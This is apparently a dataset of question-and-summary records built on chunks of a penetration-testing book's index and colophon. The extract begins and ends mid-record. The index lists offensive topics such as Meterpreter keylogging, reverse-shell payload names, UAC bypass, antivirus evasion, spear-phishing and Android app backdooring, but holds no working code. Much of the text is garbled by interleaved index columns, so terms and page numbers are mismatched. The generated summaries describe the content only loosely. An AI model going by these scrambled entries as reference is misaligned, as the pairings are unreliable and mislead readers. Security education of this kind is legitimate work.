302–304\nrunning application on, 441 SSH Exec, 299–300\nIV (initialization vector), 344 token impersonation, 300–301\ngenerating with ARP request relay LHOST, 99–100\nattack, 348–349 setting, 184\niwconfig command, 340–341 setting in Msfvenom, 104\niwlist wlan0 scan command, 341 license key, for Windows, 32\nLinksys WRT54G2, web interface, 340\nJ Linux. See also Kali Linux, Ubuntu 8.10\ntarget machine\nJava, signed Applet, 233–235\nadding code to /tmp/run file,\nJava 7 Update 6, installing, 52\n290–291\nJava Applet Attack Method, 250\ncopying and compiling exploit,\nJava Runtime Environment (JRE), 230\n289–290\njava/meterpreter/reverse_http payload, 231\ncracking passwords, 212\nJMP ESP instruction, 392\nfilesystem, 56–57\nfinding in USER32.dll, 429\nfinding an exploit, 288–289\nreliance on location, 440\nfinding a vulnerability, 287–288\nJohn the Ripper tool, 210–211, 303\nlearning kernel version, 287\nwordlists, 200, 212\nstack-based buffer overflow in,\nJRE (Java Runtime Environment), 230\n361–378\nudev privilege escalation, 287–291\nK\nVMware Player for, 9–10\nKali Linux, 55–73 listener\nbooting, 11 pushing command shell back to,\ncommand line, 56 71–72\ndata manipulation in, 64–66 setup on Kali Linux, 290\nGUI, 13 list_tokens command\nopening virtual machine, 11 (Meterpreter), 301\nrepository of exploit code, 288 little-endian architecture, 377\nrunning Android emulators, 27 LM (LAN manager) password\nsetup, 10–28 hashes, 208\nstarting Burp Suite in, 314 insecurity of, 209\ntesting Internet access for, 17 load command (Meterpreter), 301\nuser privileges, 58–61 local file inclusion, 324–327\nkaliinstall script, 28 local information gathering, 291–296\nkeyscan_dump command local privilege escalation, 283–291\n(Meterpreter), 292 for Windows, 284–285\nkeyscan_start command Local Security Authority Subsystem\n(Meterpreter), 292 Service (LSASS)\nkey-scheduling algorithm, in WEP, 345 process, 214\nkeyspace brute-forcing, 201 local users, listing all, 294\nkill command (Metasploit), 222 login screen\nKismet, 356 for Kali Linux, 12\nof web application, SQL injection\nL issues in, 319–320\nLPORT option, 216\nLAN manager (LM) password\nls command, 18, 56\nhashes, 208\nman page for, 57\ninsecurity of, 209\nlateral movement, 296–304\n484 Index\nLSASS (Local Security Authority modules, 89, 281–283. See also\nSubsystem Service), 214 specific modules\nlsb_release command, 287 advanced parameters, 223–225\nauxiliary, 107–108\nM database, 90–91\nfinding, 90–94\nMAC (Media Access Control) address,\nMS08-067, 90\nmapping IP address to, 161\npost-exploitation, 281–283\nMAC filtering, by access points, 350\nscanner, 146–147\nMac OS, and VMware Fusion, 10, 16,\nsetting options, 94–96\n31–32, 36\nverifying format\nmail servers\nspecifications, 438\nfor delivering attack email, 248–249\nwriting, 432–439\nvalid usernames for, 153\nMsfconsole for, 89\nmain function, 84\npayloads, 96–98\nmalicious code, asking users to\nbypassing filters with, 216–218\nallow, 233\nport scanners in, 306\nMaltego, 119–123\nsearch function, 91–94\nmalware, techniques to avoid detection,\nstarting, 88–90\n257–275\nsupport for encoders, 263\nman-in-the-middle attacks, 160–161\ntest run, 97–98\nEttercap for, 22, 171\nupdating, 108\nman ls command, 57\nMetasploit Browser Exploit Method, 250\nman pages, 57–58\nMeterpreter, 181–182\nmandatory code signing, 219, 441–442\nhelp for commands, 278\nmanual port scanning, 124\nkeylogger, 292\nmapping IP address, to MAC\nfor post-exploitation, 278–280\naddress, 161\nscripts, 280–281\nmass email attacks, 253–255\nsearching for files with, 291–292\nMD5 collision attack, 260\nsession, 98\nMD5 hash\nmaintaining, 222\nbrute forcing, 212\nplacing in background, 311\nchecking for trojans with, 260\nrunning scripts in, 223\nmd5sum program, 260\nshell command for dropping out\nMDM (Mobile Device\nof, 287\nManagement), 466\nupload command, 279\nMedia Access Control (MAC) address,\nMIC (message integrity code), 353\nmapping IP address to, 161\nMichael, MAC algorithm, 350\nmemory\nMicrosoft Security Essentials, 261–262\ncontent display options, 369\ninstalling, 52\nfinding attack string in memory,\nnon-detection of malware, 270\n408–411\nMicrosoft Windows.\n\nSee Windows\ntheory of, 362–364\nMing C Compiler, installing, 20\nmemory address, byte order in, 376\nMingw32 cross compiler, 268\nmessage integrity code (MIC), 353\nMitnick, Kevin, 243\nMetasm utility, 398–399\nmkdir command, 60, 207\nMetasploit\nmobile browser, attack for opening link\nadding route in, 305–306\nin, 455\nauxiliary module and exploit\nMobile Device Management\ndatabase, 91\n(MDM), 466\nexploit check functions, 147–148\nkilling background job in, 222\nIndex 485\nmobile hacking, 445–472 mv command, 60\nclient-side attacks, 454–457 MySQL\nmalicious apps, 458–463 database, for SPF, 447\nnear field communication (NFC), installing, 44\n446–447 server, privileges, 186\npivoting through devices, 466–470\nport scanning with Nmap, 467–468 N\nprivilege escalation, 471\nnano (file editor), 62–63\nremote attacks, 453–454\nNAT (network address translation), 13\nremote control, 465–466\nNational Institute of Standards and\nwith text messages, 446\nTechnology (NIST), 141\nMobile Safari, 219\nnear field communication (NFC),\nMode field in TFTP, 423\n446–447\nmodules. See Metasploit: modules\nnegative feedback, 173–174\nMona\nNessus (Tenable Security), 134–142\nfinding pattern offsets in, 387–388\ncredentials in, 137\ngenerating cyclical pattern in,\ndetailed information on\n385–388, 405\nvulnerability, 140\ninstalling, 47\nexporting results, 141–142\nrunning SEH command in, 413\ninstalling, 17–20\n!mona findmsp command (Immunity\nlogin screen, 20–22, 135\nDebugger), output, 390\nPolicies tab, 134–138\nmona pattern_create command (Immunity\nrankings, 140–141\nDebugger), 404–405\nscanning with, 138–140\nmona.py file, downloading, 46\nstarting, 18\nmoving files, 60\nnet command (Windows), 294–295\nMozilla Firefox, installing, 52\nnet localgroup command (Windows),\nMS08-067 vulnerability, 180–182\n295, 309\nMsfcli (command line interface), 89,\nnet use command (Windows), 303\n101–103\nnet user command (Windows), 309\nshowing options, 101–102\nnet users command (Windows),\nSPF to interface with, 453\n294–295\nMsfconsole, 89\nNetcat tool\nhandler for catching payload, 185\nto check for listening port, 70\nhelp command for, 89–90\nconnecting to port with, 152\nsetting up handler, 469\nfor file transfer, 72\nMsftidy tool, 438\nfor SMTP port connection, 124\nmsfupdate command, 108, 225, 438\nfor TCP/IP connections, 69–72\nMsfvenom, 258–259\nNetcraft, 114–115\ncreating standalone payloads with,\nnetstat command, 69\n103–107\nnetwork\nencoders, 264\nfor capturing traffic, 156\ngenerating shellcode, 273–274,\nconnecting virtual machine to,\n396, 428\n16–17\nmultiencoding with, 265\nmanaging, 67–69\noutput format for, 104–105\nviewing connections, 69\nprebuilt templates for detection\nnetwork adapter\nsignatures, 266\nchanging settings, 15\nserving payloads, 105, 183–185\nconfiguring for Windows XP, 31\nmulti/handler module, 105–107, 227, 469\nnetwork address translation (NAT), 13\nmulti/ssh/sshexec module, 299\nNetwork File System (NFS), 144–145\nmultipronged attacks, 255\nexploitation of open shares, 194–196\n486 Index\nnetwork interface, 67 OSVDB (Open Sourced Vulnerability\nadding second, 52 Database), 149\nnetwork mask, 68 output format, for Msfvenom, 104–105\nNFC (near field communication), overflowtest.c file, functions in, 375\n446–447 OWASP (Open Web Application\nNFS (Network File System), 144–145 Security Project), 335\nexploitation of open shares, 194–196 owner, permissions for, 62\nNikto, 149\nNIST (National Institute of Standards P\nand Technology), 141\npack method (Ruby), 435\nNmap port scanning, 125–131\npackages, managing installed, 66\nfor mobile devices, 467–468\nPacket Storm Security, 88\nrunning through ProxyChains, 308\npairwise master key (PMK), in WPA/\nscanning a specific port, 130–131\nWPA2, 352\nSYN scan, 125–127\npairwise transient key (PTK), 352\nUDP scan, 128–130\npass the hash technique, 298–299\nversion scan, 127–128\npassphrase, for WPA or WPA2, 353\nNmap Scripting Engine (NSE),\npassword attacks, 197–214\n142–144\noffline, 203–213\ndefault scripts output, 143–144\nonline, 198–203\nrunning single script, 144–146\npassword hashes\nnondisclosure agreement, 4\nconverting to plaintext, 203\nNOP sled, 428–429\nfor domain users, 302\nNSE. See Nmap Scripting Engine (NSE)\ndumping with physical access,\nnslookup, 116–117, 167\n206–208\nNT LAN Manager (NTLM) hash, for\nexample, 211\npassword hash, 208\nLM vs. NTLM algorithms, 208\ncracking with John the Ripper,\nrecovering from Windows SAM file,\n210–211\n204–206\nreversing, 203, 298\nO\npasswords\noffset cracking with John the Ripper, 210\ngenerating cyclical pattern to cracking Linux, 212\ndetermine, 385–388 default root for SSH, 453\nverifying, 388–389, 390 dumping plaintext with WCE,\nOpcode field, in TFTP, 423 213–214\nopen relay, 249 guessing with Hydra, 202–203\nopen source intelligence (OSINT), 4 lists of, 199–201\nDNS reconnaissance, 116–118 managing, 197–198\nMaltego, 119–123 for Nessus, 20\nNetcraft, 114–115 online services for cracking, 213\nport scanning, 123–131 recovering MD5 hashes, 188\nsearching for email addresses, saving, 293\n118–119 setting in Windows 7 target\nwhois lookups, 115–116 machine, 49\nOpen Sourced Vulnerability Database setting in Windows XP, 37\n(OSVDB), 149 strong, 198\nOpen Web Application Security Project system hashes, 194\n(OWASP), 335 use of same on multiple systems, 296\nopen wireless network, 343 PATH environmental variable, 77\nOSINT.",
    "question": "What are the key resources and tools provided in the text for penetration testing, vulnerability assessment, and security-related tasks?",
    "summary": "The text provides a list of resources and tools for penetration testing, including the Metasploit Framework, Nmap, and various websites for vulnerability research and exploitation. It also covers topics like information gathering, password attacks, social engineering, and bypassing antivirus software. Additionally, it includes details on specific techniques and tools used in wireless attacks, web application testing, and mobile security."
  },
  {
    "start": 134,
    "end": 136,
    "text": "See open source intelligence pattern matching, with awk, 66\nIndex 487\npaused process, Immunity Debugger port 4444, 98\nand, 381–382 port scanning, 123–131\npayloads, 180–181 manual, 124\navoiding special characters, 396 in Metasploit, 306\ncreating standalone with Msfvenom, with Nmap, 125–131, 467–468\n103–107 with Python script, 82\nhandler for, 227 Portable Document Format (PDF)\nlisting in Msfvenom, 104 software, exploitation with,\nin Msfcli, 102–103 225–235\nserving, 105 porting public exploits, 427–432\nsetting manually, 99–101 ports, 69, 95\nfor structured exception handler default, for Simple Mail Transfer\noverwrite, 418–419 Protocol (SMTP), 124\npayment terms, 3 exploring, 151–152\nPBKDF2 hashing algorithm, 352 Netcat for connecting to, 152\nPDF (Portable Document Format) Nmap port scanning for specific,\nsoftware, exploitation with, 130–131\n225–235 post-exploitation phase of penetration\npenetration testing testing, 2, 4–5, 277–311\nbasics, 1–2 gathering credentials, 292–294\ndata, tracking, 125–126 keylogging, 292\nstages, 2–6 lateral movement, 296–304\nPenetration Testing Execution Standard local information gathering, 291–296\n(PTES), 2 local privilege escalation, 283–291\nPerl scripting language Metasploit modules, 281–283\nfor creating argument string, 376 Meterpreter for, 278–280\nstring generation by, 372 mobile, 463–471\npersistence, 309–311 modules, 281–283\npersistence script (Meterpreter), 310–311 persistence in, 309–311\npersonal connection process, in WPA/ pivoting, 304–308\nWPA2, 351 PostgreSQL database, 88\nphishing attack, 244 post/windows/gather/enum_logged_on_users\nvia email, automating, 253 module, 282\nphpMyAdmin, 149–150 post/windows/gather/hashdump\nexploitation, 186–188 module, 298\nping command, 17, 38 Powershell, in Windows 7, 329\nlimiting number of times, 78 pre-engagement phase of penetration\nstopping, 39 testing, 2–4\nping sweep, script for, 76 print command\npipe (|), 65 Perl, 372\npivoting, 304–308 Python, 83\nthrough mobile devices, 466–470 printf function, 84\nSocks4a and ProxyChains, 307–308 private SSH keys, 194\nplaintext privilege escalation, in mobile devices,\nconverting hashes to, 203 470–471\nfor credentials, 174 privileged commands, running, 59\ndumping passwords with Windows PRNG (pseudorandom number\nCredential Editor, 213–214 generator), 267, 345\nPMK (pairwise master key) in WPA/ processes, 67\nWPA2, 352 Immunity Debugger and paused,\nPOP instruction, 363, 411–412 381–382\nreliance on location, 440\n488 Index\nprogramming, 75–85. See also Bash randomize_va_space, 364–365\nscripts; Python rand_text_english function (Metasploit),\nbreakpoints in, 368 435, 438\nC programs, 84–85 Rapid7, 87\nRuby, for Metasploit modules, 432 raw_input function (Python), 82\nproprietary data, loss of, 2 RC4 (Rivest Cipher 4) stream\nprotocol analyzer. See also Wireshark cipher, 343\nProxyChains, 307–308 Rcrack tool, 213\nps aux command, 290 read (r) permissions, 62\nps command (Meterpreter), 67, 295 Ready to Create Virtual Machine\nPSExec technique, 296–297, 298 dialog, 30\npseudorandom number generator redirecting input, > symbol for, 61\n(PRNG), 267, 345 reflective DLL injection, 181\nPTES (Penetration Testing Execution reflective XSS attacks, 329\nStandard), 2 checking for vulnerability, 330\nPTK (pairwise transient key), 352 registers\npublic exploits in Intel-based CPU, 362–363\nporting, 427–432 jumping to, 392\nrisks of working with, 142 relative path, 56\npublic SSH key, 194 remote attacks, 453–454\npublisher, trusted vs. unknown, 235 Remote Authentication Dial-In\nPUSH ESP instruction, 393 User Service (RADIUS)\nPUSH instruction, 363, 411 server, 351\npwd command, 56 remote control\nPython, 81 of mobile devices, 465–466\nconnecting to a port, 83 USSD, 456–457\nCtypes library, 271 remote file inclusion, for web\nif statements, 83 application testing, 327\ninstalling, 46 remote system\nporting exploit, 436 logging into, 298\nvariables in, 82 pinging, 76\nVirtualAlloc injection, 271 removing files, 60\nPython-generated executables, creating reporting phase of penetration testing,\nencrypted with Veil-Evasion, 2, 5–6\n270–274 researching vulnerabilities, 142\nresource exhaustion attack, 471\nQ RET instruction, 411–412\nreliance on location, 440\nQR (quick response) codes, 447\nreturn address, 363\nquery, Wireshark capture of, 166\nfinding, 429–430\nusing from executable module, 394\nR\nreturn statement (C), 85\nRADIUS (Remote Authentication return-oriented programming\nDial-In User Service) (ROP), 441\nserver, 351 rev2self command (Meterpreter), 284\nRadmin Viewer program, trojan reverse shells, 71, 98–99, 180\nand, 259 reverse_https_proxy payload\nradmin.exe binary, embedding payload (Meterpreter), 218\ninside, 259 RHOST option, for Metasploit module,\nRailgun, 283 94–95\nrainbow tables, 213 risk profile, 5\nrandom variable, 267 risks of public exploit code, 88\nIndex 489\nRivest Cipher 4 (RC4) stream security updates, turning off\ncipher, 343 automatic, 34\nrm file command, 60 SecurityFocus.com, 88, 380, 427\nrockyou.txt.gz file, 200 sed command, 65\nroot privileges, 56, 194, 287–291 to delete final character from each\nroot@kali# prompt, 56 line, 81\nROP (return-oriented SEH chain, 401\nprogramming), 441 viewing, 402\nroute command (Metasploit), 68, SEH overwrites. See structured\n305–306 exception handler\nrouter, for wireless traffic, 339 overwrites\nRPORT option, for Metasploit module, 95 SEH registration record, 401\nRtlMovememory API, 271 Select Guest Operating system\nRuby, for Metasploit modules, 432 dialog, 29\nrun migrate command (Meterpreter), 280 self-signed SSL certificates, social\nrunning processes, viewing, 67 engineering tests with, 173\nsensitive files, downloading, 188–189\nS service command, 67\nservices, 67\nSafeSEH, 412–416\nsession, bringing to foreground, 283\nSAM (Security Accounts Manager) file\nSET (Social-Engineer Toolkit), 235,\ndownloading, 189\n244–245\nrecovering password hashes from,\nspear-phishing attacks, 245–250\n204–206\nset payload command (Metasploit), 99\nSamdump2, 205\nsetoolkit command, 245\nsaving\nshell command, for dropping out of\npasswords, 293\nMeterpreter, 287\ntext to file, 61\nshell scripts, 75\nSCADA systems, 131\nshellcode\nscanner/portscan/tcp module, 306\nMsfvenom for generating, 273–274,\nscanning\n428\nlegality of, 124\nreplacing, 430\nwith w3af, 335–337\nshellcode variable, in custom C code, 267\nweb application, 148–151\nshells, 395–400\nscope of pentest, 3\nclosing, 100\nscripts. See also Bash scripts; Python\ntypes of, 98–99\nrunning automatically, 72\nshikata_ga_nai encoder, 264\nrunning in Meterpreter, 223\nshort jump assembly instruction,\nrunning on target web server, 183\n416–417\nsearch command (Meterpreter),\nshow advanced command\n291–292\n(Metasploit), 223\nsearching\nshow options command (Metasploit), 94,\nMetasploit auxiliary module and\n96, 99\nexploit database, 91\nshow payloads command (Metasploit),\nfor text, 63\n96–97, 180, 190–191,\nsearchsploit utility, 288\n216–218\nSecure Socket Layer (SSL) attacks,\nshow targets command (Metasploit),\n170–172\n95–96, 234\nstripping attacks, 173–174\nsignatures\nSecurity Accounts Manager file. See\nfor antivirus applications, 438\nSAM (Security Accounts\nfor apps, 462\nManager) file\nsigned Java Applet, 233–235\n490 Index\nSimple Mail Transfer Protocol (SMTP), single vs. mass email, 247–248\ndefault port for, 124 template for, 248\nskins in Winamp, malicious code in, special characters, avoiding for\n239–240 payload, 396\nslash (/), as delimiter character in Specify Disk Capacity dialog, 30\nsed, 65 SPF.\n\nSee Smartphone Pentest\nSLMail 5.5, downloading and Framework (SPF)\ninstalling, 41–42 SQL commands, executing, 186\nSmartphone Pentest Framework (SPF), SQL injection, 319–322\n445, 447–452 SQLMap, 321–322\nAndroid emulators, 449 SRVHOST option, 220\nattaching app, 452 SSH, default root password, 453\nattaching to deployed agent, .ssh directory, 194\n460–461 vulnerability from access, 145–146\nattaching mobile modem, 449 SSH Exec, 299–300\nbackdooring APKs, 461–464 SSH key pair, generating, 195\nbuilding Andoid app, 449–450 ssh-add command, 195\ncreating malicious agents, 458–463 ssh-keygen command, 195\ndownloading and installing, 27–28 SSL (Secure Socket Layer) attacks,\nrunning exploit through agent, 468 170–172\nsetting up, 447–449 stripping attacks, 173–174\nstarting, 448 SSL certificate, warning of invalid, 19\nSMB capture, 302–304 SSLstrip, 173–174\nSMBPIPE option, for Metasploit stack, 362, 363\nmodule, 95 following ESP register on, 408–409\nSMS, for spam and phishing attacks, 446 as last-in, first-out (LIFO)\nSMTP (Simple Mail Transfer Protocol), structure, 411\ndefault port for, 124 stack-based buffer overflow in Linux,\nSocial-Engineer Toolkit (SET), 235, 361–378\n244–245 C program vulnerable to, 365–366\nspear-phishing attacks, 245–250 causing crash, 366–367, 372–373\nsocial engineering, 243–255 EIP register control, 373–375\nmass email attacks, 253–255 hijacking execution, 375–376\nmultipronged attacks, 255 stack-based buffer overflow in\ntests, with self-signed SSL Windows, 379–400\ncertificates, 173 causing crash, 382–384\nweb attacks, 250–252 getting shell, 395–400\nsocket library, 82 hijacking execution, 390–395\nSocks4a, 307–308 locating EIP register, 384–388\nsoftware searching for known vulnerability\ninstalling vulnerable, 40–47 in War-FTP, 380–382\ninvestigating running, for stack buffer, 379\nvulnerabilities, 295 stack cookies, 439–440\nuser account for, 58 staged payloads, 181\nversions in banners, 124 static analysis, 260\nsource code, backdooring, 458–461 static IP address\nspear-phishing attacks, 245–250 setting, 38–39, 68–69\nchoosing a payload, 246–247 for Windows 7 target machine, 51\nlistener setup, 249–250 stdio library (C), 84\nnaming malicious file, 247 stealing stored credentials, 294\nsetting options, 247 stopping keylogger, 292\nsetting target, 248–249 stored XSS attacks, 329\nIndex 491\nstrategic road map, 6 TFTP (Trivial FTP) server\nstrcpy function, 366–367, 422 downloading file with, 187–188\nstring, generating with Perl script, 372 fuzzing program, 424–426\nstrong passwords, 198 packet, 435\nstructured exception handler (SEH) packet format, 423\noverwrites, 401–419 writing to file, 438\nchoosing payload, 418–419 Thawte (certificate authority), 171\nexploits, 403–407 theHarvester (Python tool), 118–119\nfinding attack string in memory, then statement, in Bash scripts, 78\n408–411 third-party software, exploiting buffer\nreplacing with POP POP RET, 414, 415 overflow in, 190–191\nSafeSEH, 412–416 third-party web applications,\nshort jump assembly instruction, exploitation, 191–193\n416–417 threat-modeling phase of penetration\nstructured exception handler, passing testing, 2, 4\ncontrol to, 407–408 TikiWiki CMS software, 191–192\nsu command, 59–60 TKIP (Temporal Key Integrity\nsudo command, 59 Protocol), 350\nsudoers file, 59 TLS (Transport Layer Security)\nsuperuser (root) prompt, 16 encryption, 181\nswitches, and traffic capture, 156 /tmp/run file (Linux), adding code to,\nSYN scan, 125–127 290–291\nSyskey utility, encryption key for, token impersonation, 300–301\n189, 205 touch command, 60\nsystem() command (PHP), 186 tr utility (Linux), 267\nsystem password hashes, 194 training employees, about social\nsystem privileges, session running engineering, 244\nwith, 297 Transport Layer Security (TLS)\nencryption, 181\nT Trivial FTP server. See TFTP (Trivial\nFTP) server\nTabnabbing Attack Method, 251\ntrojans, 258–259\ntarget virtual machines, 28–29. See also\nMD5 hash to check for, 260\nWindows 7 target machine,\nTrustedSec, Social-Engineer\nWindows XP target machine,\nToolkit, 244\nUbuntu 8.10 target machine\ntwo-factor authentication, 198\nTCP connection\ncreating socket, 82\nU\nNetcat tool for, 69–72\nthree-way handshake, 125 UAC (user account control), 285–287\nTCP scan, 127 Ubuntu 8.10 target machine, 28. See\nTCP stream, Wireshark for also Linux\nfollowing, 159 setup, 48\ntechnical report, 6 udev (device manager for Linux), 288\nTemporal Key Integrity Protocol UDP scans, 128–130, 295\n(TKIP), 350 UDP socket, setting up, 435\nTenable Security, Nessus, 17, 134–142 uname command, 287\ntesting window, 3 unstructured supplementary service\ntext data (USSD), 456–457\nadding to file, 61 upload command (Meterpreter), 279\nsearching for, 63, 65 uploading, Msfvenom payload,\ntext messages, mobile hacking with, 446 183–185\ntext segment of memory, 362 URIPATH option, 221\n492 Index\nuser account control (UAC), 285–287 Windows 7 target machine, 48–54\nuser accounts Windows XP target machine,\nadding, 58–59 29–40\nadding, persistence and, 309 Virtual Machine Settings dialog, 15\nadding to sudoers file, 59 virtual machines\ncreating in Windows, 35, 48–49 configuring network for, 13–17\nin Linux, 58 connecting to network, 16–17\nfor logging in to FTP, 165 to delay booting, 207\nswitching, 59–60 target, 28–29\nuser lists, 199 virtual networks, and traffic\nuser password. See passwords capture, 156\nuser privileges, 58–61 VirtualAlloc injection method, 271\nUSER32.dll, 429–430 VirusTotal, 262–263\nusernames results for encoded binary, 265\nfinding, 118 VMware, installing, 9–10\nfinding valid, 153 VMware Fusion (Mac OS), 10, 16, 31–32\nguessing with Hydra, 202–203 installing VMware Tools for, 36\nusers. See also social engineering VMware Player (Windows), 9–10,\ndownloading payload by, 105 14–15, 35–36\nenticing to download and install installing Windows XP on, 29–31\nAndroid agent, 460 VMware Tools\nlisting all local, 294 installing on Windows XP target\nlogging keystrokes by, 292 machine, 35–36\nsending messages to contacts, 465 installing on Windows 7 target\n/usr/share/exploitdb/platforms/linux/ machine, 48, 50\nlocal/8572.c exploit, 288–289 VMware Workstation, 10\n/usr/share/metasploit-framework/modules/ .vmx configuration file, 207\npost/windows/gather/ VRFY SMTP command, 153\ncredentials module, 292 Vsftpd (Very Secure FTP) 2.3.4,\nUSSD (unstructured supplementary 133–134, 193–194, 258\nservice data), 456–457 vulnerabilities, 133–153\nin Java, 230–233\nV manual analysis, 151–153\nresearching, 142\nvariables, in Python, 82\nsearching for known, in War-FTP,\nVeil-Evasion, 270–274\n380–382\navailable payloads, 272\nweb application scanning, 148–151\ninstalling, 21\nvulnerability analysis phase of\nPython VirtualAlloc in, 273\npenetration testing, 2, 4\nVeriSign (certificate authority), 171\nvulnerability repository, 149\nversion scan, 127–128\nvulnerability scanners\nVery Secure FTP (Vsftpd) 2.3.4,\nNessus Home, 17\n133–134, 193–194, 258\nreasons to use, 141\nvi (file editor), 62\nvulnerable software, installing, 40–47\nediting file, 63\nvirtual lab setup, 9–54\nW\ninstalling VMware, 9–10\ninstalling vulnerable software, w3af (Web Application Attack and\n40–47 Audit Framework), 335–337\nKali Linux setup, 10–28 War-FTP\ntarget virtual machines, 28–29 crashing, 397–398, 403\nUbuntu 8.10 target machine, 48 downloading and installing, 46\nPython exploit to crash, 383\nIndex 493\nWar-FTP (continued) Winamp\nsearching for known vulnerability installing, 52\nin, 380–382 replacing configuration file for,\nUSER buffer overflow, 439 237–239\nwarning, for PDF embedded Windows\nexecutable, 229 APIs, Railgun for accessing, 283\nWarning: system() [function.system]: clipboard, stealing data from, 334\nCannot execute a blank firewall\ncommand in...\n\nmessage, 187 and response to ping, 51\nWCE (Windows Credential Editor), turning off, 37\n213–214 Security Accounts Manager\nWeb Application Attack and Audit (SAM) file\nFramework (w3af), 335–337 downloading, 189\nweb application testing, 313–337 recovering password hashes\nwith Burp Proxy, 314–319 from, 204–206\ncommand execution, 327–329 Service Control Manager, remote\ncross-site request forgery, 335 procedure call (RPC), 296\ncross-site scripting (XSS), 329–335 Syskey utility, 189\nlocal file inclusion, 324–327 VMware Player, 9–10, 14–15\nremote file inclusion, 327 Windows 7 target machine, 48–54\nscanning with w3af, 335–337 adding second network interface, 52\nsigning up for account, 317–318 bypassing UAC on, 285–287\nSQL injection, 319–322 creating user account, 48–49\nXPath injection, 323–324 dumping hashes with physical\nweb applications attack, 206–207\naccess to server-side source installing additional software,\ncode, 326 52–54\nthird-party, exploitation, 191–193 opting out of automatic updates, 50\nvulnerability scanning, 148–151 Powershell in, 329\nweb browsers. See browsers turning off real-time protection, 53\nweb server Windows 2000, LM hashes storage, 211\ncopying app to, 451 Windows Credential Editor (WCE),\nrunning script on target, 183 213–214\nweb server software, system privileges Windows XP target machine, 28\nand, 185 activating, 34\nWebDAV (Web Distributed Authoring creating, 29–40\nand Versioning) installing, 32–35\nsoftware, 150 LM hashes storage, 211\nexploiting default credentials, local privilege escalation, 284–285\n182–183 Nessus detection of\nWebEx, Java for, 241 vulnerabilities, 139\nWebKit package, attacking, 454–456 setup to behave as member of\nwebsites, for wordlists, 200 Windows domain, 39–40\nWEP. See wired equivalent windows/local/bypassuac exploit, 286\nprivacy (WEP) windows/meterpreter/bind_tcp payload, 307\nwget command, 289 windows/meterpreter/reverse_tcp payload,\nwhoami command, 71, 291 247, 265, 273–274\nwhois lookups, 115–116 windows/smb/ms08_067_netapi\nWi-Fi protected access (WPA), 350 module, 306\nWi-Fi Protected Setup (WPS), 356–357 WinSCP, 292–294\nWifite tool, 350, 356 downloading and installing, 46\n494 Index\nwired equivalent privacy (WEP), X\n343–350\nx/16xw $esp command (GDB), 369\nchallenges, 350",
    "question": "What is the purpose and methodology of the Smartphone Pentest Framework (SPF) in the context of mobile device security testing?",
    "summary": "The text discusses various aspects of penetration testing, including tools like Metasploit, Nmap, and Python for scanning ports, creating payloads, and exploiting vulnerabilities. It also covers techniques for handling credentials, bypassing security measures, and analyzing software for weaknesses. Key topics include wireless security protocols, mobile device exploitation, and methods for bypassing user account control."
  },
  {
    "start": 137,
    "end": 137,
    "text": "XAMPP\ncracking keys with Aircrack-ng,\nApache, default install location, 186\n347–350\nattacking, 149–150\nweaknesses, 346\ndefault credentials, 150–151\nwireless attacks, 339–357\ndefault login credentials for\ncapturing packets, 342–343\nWebDav, 182\nscanning for access points, 341\ninstalling, 43–45\nsetup, 339–341\nstarting control panel, 43\nviewing available interfaces,\nXML\n340–341\nattacks on, 323–324\nWi-Fi protected access, 350\nusernames and passwords in, 326\nWi-Fi Protected Setup (WPS),\nXpath, 320\n356–357\ninjection, 323–324\nwired equivalent privacy (WEP),\nxp_cmdshell() function, 188\n343–350\nxp_cmdshell stored procedure, 322\nWPA2, 351–356\nxphashes.txt file, 210\nwireless network\nXSS (cross-site scripting), 329–335\nmonitor mode, 341–342\nchecking for reflective\nopen, 343\nvulnerability, 330\nWireshark, 156–160\nleveraging with BeEF, 331–335\ncapturing traffic, 156–158\ndissecting packets, 160\nZ\nfiltering traffic, 158–159\nfollowing TCP stream, 159 zero-day vulnerability, 220, 240\nfor viewing WPA2 handshake, 355 Zervit server, 40–41\nwordlists for passwords, 199–201 crashes from Nmap scan, 130, 131\nWorkgroup settings, for Windows XP, 33 zone transfers, DNS, 117–118\nWPA (Wi-Fi protected access), 350\nWPA2, 351–356\ncracking keys, 353–356\ndictionary attack against, 356\nenterprise connection process, 351\nfour-way handshake, 352–353\npersonal connection process, 351\nWPS (Wi-Fi Protected Setup), 356–357\nwrite (w) permissions, 62\nIndex 495\nPenetration Testing is set in New Baskerville, TheSansMono Condensed,\nFutura, and Dogma. The book was printed and bound by Sheridan Books,\nInc. in Chelsea, Michigan. The paper is 60# Finch Offset, which is certified\nby the Forest Stewardship Council (FSC).\nThe book uses a layflat binding, in which the pages are bound together\nwith a cold-set, flexible glue and the first and last pages of the resulting\nbook block are attached to the cover. The cover is not actually glued to the\nbook’s spine, and when open, the book lies flat and the spine doesn’t crack.\nUpdates\nVisit http://nostarch.com/pentesting/ for updates, errata, and other\ninformation.\nMore no-nonsense books from no starcH press\nandroid secUrity internals tHe practice of network practical Malware analysis\nan in-depth Guide to android’s secUrity MonitorinG the Hands-on Guide to dissecting\nsecurity architecture Understanding incident detection Malicious software\nby nikolay elenkov and response by michael sikorski and\nseptember 2014, 384 pp., $49.95 by richard bejtlich andrew honig\nisbn 978-1-59327-581-5 july 2013, 376 pp., $49.95 february 2012, 800 pp., $59.95\nisbn 978-1-59327-509-9 isbn 978-1-59327-290-6\nMetasploit practical packet analysis, HackinG, 2nd edition\nthe penetration tester’s Guide 2nd edition the art of exploitation\nby david kennedy, jim o’gorman, Using wireshark to solve by jon erickson\ndevon kearns, and mati aharoni real-world network problems february 2008, 488 pp. w/cd, $49.95\njuly 2011, 328 pp., $49.95 by chris sanders isbn 978-1-59327-144-2\nisbn 978-1-59327-288-3 july 2011, 280 pp., $49.95\nisbn 978-1-59327-266-1\nphone: email:",
    "question": "What are the key topics and concepts covered in the section about XAMPP, wireless attacks, and related security tools and techniques?",
    "summary": "The text discusses various aspects of penetration testing, including tools like XAMPP, Wi-Fi attacks (WPS, WPA2), and XML injection. It also covers topics such as default credentials, packet capturing with Wireshark, and vulnerabilities like zero-day exploits. Additionally, it lists several books from No Starch Press related to penetration testing and malware analysis."
  },
  {
    "start": 138,
    "end": 138,
